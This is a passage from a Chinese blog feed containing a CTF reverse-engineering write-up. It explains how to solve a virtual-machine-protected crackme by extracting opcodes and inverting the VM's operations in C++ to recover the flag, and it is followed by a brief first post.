class="number">57</span>, <span class="number">58</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">63</span>, <span class="number">64</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">86</span>, <span class="number">88</span>, <span class="number">90</span>, <span class="number">92</span>, <span class="number">94</span>, <span class="number">96</span>, <span class="number">98</span>, <span class="number">100</span>, <span class="number">102</span>, <span class="number">104</span>, <span class="number">106</span>, <span class="number">108</span>, <span class="number">110</span>, <span class="number">112</span>&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样我们就得到了每次switch需要执行时需要使用的操作数的索引和最终需要生成的结果。加上已有的操作数数据，我们下一步需要去逆向算法。</p><p>我们也可以打印出每次执行的a1的结果：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a1 = &#123;<span class="number">10</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>&#125;;</span><br></pre></td></tr></table></figure><p>观察a1发现后面执行的结果都是7，对应着操作数中“比较”的过程这就意味着整个程序先进行运算，最后都运算结束后统一进行比较。</p><p>对代码进行修改和运行是一个比较麻烦的事情，在下面修改的代码中我会将注释写的尽量详细一些：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">vm_operad</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// eax </span></span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">    <span class="type">int</span> v5; <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">    <span class="type">int</span> v8; <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">    <span class="type">int</span> v9; <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> opcode[<span class="number">114</span>] = &#123;<span class="comment">//将opcode提取出来通常可以安装插件convert或者按shift+e</span></span><br><span class="line">    <span class="number">0x0000000A</span>, <span class="number">0x00000004</span>, <span class="number">0x00000010</span>, <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x00000020</span>, <span class="number">0x00000008</span>, <span class="number">0x00000005</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000B</span>,</span><br><span class="line">    <span class="number">0x00000001</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000003</span>,</span><br><span class="line">    <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x00000021</span>, <span class="number">0x00000001</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000004</span>, <span class="number">0x00000009</span>, <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x00000020</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000051</span>,</span><br><span class="line">    <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000024</span>, <span class="number">0x00000001</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000002</span>, <span class="number">0x00000025</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000036</span>,</span><br><span class="line">    <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000041</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000020</span>, <span class="number">0x00000008</span>, <span class="number">0x00000005</span>,</span><br><span class="line">    <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000003</span>, <span class="number">0x00000008</span>, <span class="number">0x00000002</span>, <span class="number">0x00000025</span>, <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000004</span>, <span class="number">0x00000009</span>, <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x00000020</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000041</span>,</span><br><span class="line">    <span class="number">0x00000008</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000001</span>, <span class="number">0x00000007</span>, <span class="number">0x00000022</span>, <span class="number">0x00000007</span>, <span class="number">0x0000003F</span>, <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0x00000034</span>, <span class="number">0x00000007</span>, <span class="number">0x00000032</span>, <span class="number">0x00000007</span>, <span class="number">0x00000072</span>, <span class="number">0x00000007</span>, <span class="number">0x00000033</span>, <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0x00000018</span>, <span class="number">0x00000007</span>, <span class="number">0xFFFFFFA7</span>, <span class="number">0x00000007</span>, <span class="number">0x00000031</span>, <span class="number">0x00000007</span>, <span class="number">0xFFFFFFF1</span>, <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0x00000028</span>, <span class="number">0x00000007</span>, <span class="number">0xFFFFFF84</span>, <span class="number">0x00000007</span>, <span class="number">0xFFFFFFC1</span>, <span class="number">0x00000007</span>, <span class="number">0x0000001E</span>, <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0x0000007A</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//使用opcode的顺序即执行sitch的时候v9的顺序</span></span><br><span class="line">    <span class="type">char</span> order[<span class="number">100</span>] = &#123; <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">63</span>, <span class="number">64</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">86</span>, <span class="number">88</span>, <span class="number">90</span>, <span class="number">92</span>, <span class="number">94</span>, <span class="number">96</span>, <span class="number">98</span>, <span class="number">100</span>, <span class="number">102</span>, <span class="number">104</span>, <span class="number">106</span>, <span class="number">108</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">114</span>&#125;;</span><br><span class="line">    <span class="comment">//最终比较的结果，我们需要把它按照算法进行逆过去</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc_flag[] = &#123; <span class="number">0X22</span>, <span class="number">0X3F</span>, <span class="number">0X34</span>, <span class="number">0X32</span>, <span class="number">0X72</span>, <span class="number">0X33</span>, <span class="number">0X18</span>, <span class="number">0XFFFFFFA7</span>, <span class="number">0X31</span>, <span class="number">0XFFFFFFF1</span>, <span class="number">0X28</span>, <span class="number">0XFFFFFF84</span>, <span class="number">0XFFFFFFC1</span>, <span class="number">0X1E</span>, <span class="number">0X7A</span> &#125;;</span><br><span class="line">    <span class="comment">//flag用来存储最终flag</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line">    v8 = <span class="number">15</span>;</span><br><span class="line">    v6 = <span class="number">15</span>;</span><br><span class="line">    v5 = <span class="number">15</span>;</span><br><span class="line">    <span class="comment">//从后往前逆向需要从后向前索引</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="built_in">strlen</span>(order)<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)<span class="comment">//从order最后一个数向第一个数推</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//反方向进行逆向</span></span><br><span class="line">        v9 = order[i];<span class="comment">//v9每次取值，这样就不用对v9进行操作了</span></span><br><span class="line">        <span class="keyword">switch</span> (opcode[v9])                       </span><br><span class="line">       &#123;                                           </span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            --v8;<span class="comment">//整个case结构的代码倒着写</span></span><br><span class="line">            --v6;</span><br><span class="line">            v4 = enc_flag[v6];<span class="comment">//这个地方在ida里显示的是v6+100地址与case 7对应比较的位置相同，所以对应着最后的比较结果的地址。</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            flag[v8] = v4 - opcode[v9 + <span class="number">1</span>];<span class="comment">//这个flag是用户输入的地址，所以我们使用flag进行接收</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            flag[v8] = v4 + opcode[v9 + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            flag[v8] = (opcode[v9 + <span class="number">1</span>] ^ v4) &amp; <span class="number">0xff</span>;<span class="comment">//抑或的时候容易产生溢出，所以需要&amp;0xff</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            flag[v8] = v4 / opcode[v9 + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            --v5;</span><br><span class="line">            v4 = flag[v5];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">            flag[v8] = v4 + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">            flag[v8] = v4 - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);<span class="comment">//最后打印flag</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//757515121f3d478</span></span><br></pre></td></tr></table></figure><p>另一种思路：</p><p>可以进行动态调试找到每次使用的操作数和最后的比较结果，然后分析每次执行的过程，每次进行逆向。</p><p>其他就是使用符号执行的方法了，不在本次基本解题讨论之中。</p><h2 id="VM解题总结"><a href="#VM解题总结" class="headerlink" title="VM解题总结"></a>VM解题总结</h2><p>vm题目的基本结构就像在定义中提供的图片那样，它使用调度器使不同的流程对应不同的操作码以此干扰分析者常规分析的思路。基于以上的学习我们可以简单的总结一下这些题目应该怎么做：</p><p>1.找到程序每次都取哪个操作数（执行哪个流程），并提取出来</p><p>2.找到程序经过VM各过程加密运算的结果</p><p>3.逆向VM加密函数</p><h2 id="其他内容"><a href="#其他内容" class="headerlink" title="其他内容"></a>其他内容</h2><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.52pojie.cn/thread-1176826-1-1.html">2020网鼎杯青龙组部分逆向题 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><p><a href="http://ronpa.top/2018/08/08/%E5%8D%97%E9%82%AECTF-wp/">南邮CTF_wp | Ronpa的博客</a></p><p><a href="https://forum.butian.net/share/1195">奇安信攻防社区-那CTF，那VMre，那些事（一） (butian.net)</a></p><p><a href="https://lingze.xyz/pages/7885eb/">vm | Lingze’s blog</a></p><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p>链接：<a href="https://pan.baidu.com/s/1lduWDMdc329LO-kJJv23Mw?pwd=wg7v">https://pan.baidu.com/s/1lduWDMdc329LO-kJJv23Mw?pwd=wg7v</a><br>提取码：wg7v</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;逆向中的虚拟机保护是一种基于虚拟机的代码保护技术。它将基于x86汇编系统中的可执行代码转换为字节码指令系统的代码，来达到不被轻易逆向和篡改的目的。&lt;/p&gt;</summary>
    
    
    
    <category term="reverse" scheme="http://example.com/categories/reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>这是一个开始</title>
    <link href="http://example.com/2022/10/06/%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E5%BC%80%E5%A7%8B/"/>
    <id>http://example.com/2022/10/06/%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E5%BC%80%E5%A7%8B/</id>
    <published>2022-10-06T09:31:50.485Z</published>
    <updated>2022-10-06T10:00:12.096Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个开始！</p><span id="more"></span>]]></content>
    
    
    <summary type="html">&lt;p&gt;这是一个开始！&lt;/p&gt;</summary>
    
    
    
    <category term="生活" scheme="http://example.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
  </entry>
  
</feed>
